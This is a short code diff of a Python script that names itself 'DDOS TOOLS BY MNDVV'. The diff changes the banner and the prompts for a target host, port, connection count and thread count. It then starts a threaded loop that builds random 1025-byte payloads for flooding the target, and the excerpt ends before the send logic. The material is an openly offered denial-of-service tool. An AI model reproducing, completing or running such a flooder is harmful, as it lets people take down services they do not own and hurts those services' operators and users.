@@ -3,18 +3,13 @@ import random
 import socket
 import threading
 
-print('''██████░░░██████╗░████████░██████╗░
-██╔══██╗░██╔═══╝░╚═╗██╔═╝░╚═╗██╔╝░
-██████╔╝░████╗░░░░░║██║░░░░╔██╔╝░░
-██░░░██╗░██╔═╝░░░░░║██║░░░╔██╔╝░░░
-██░░░██║░██████╗░░░║██║░░░██████╗░
-╚══════╝░╚═════╝░░░╚══╝░░░╚═════╝░''')
+print('''DDOS TOOLS BY MNDVV''')
 
-ip = str(input("ip:"))
-port = int(input("Port:"))
-times = int(input("Connections:"))
-threads = int(input("Threading:"))
-choice = str(input("Ready? (y):"))
+ip = str(input("HOST:"))
+port = int(input("PORT:"))
+times = int(input("TIMES:"))
+threads = int(input("THREAD:"))
+choice = str(input("Are You Sure? (y):"))
 def run():
 	data = random._urandom(1025)
 	while True:
